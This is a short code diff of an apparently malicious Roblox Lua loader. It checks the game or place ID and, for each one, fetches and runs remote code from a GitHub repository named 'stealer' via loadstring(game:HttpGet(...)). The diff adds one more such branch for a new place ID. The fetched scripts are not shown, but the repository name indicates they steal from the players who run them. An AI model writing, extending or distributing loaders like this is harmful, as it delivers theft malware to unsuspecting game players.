@@ -4,4 +4,6 @@ elseif game.GameId == 10200395747 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag2"))()
 elseif game.PlaceId == 142823291 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-mm2"))()
+elseif game.PlaceId == 920587237 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-ame"))()
 end
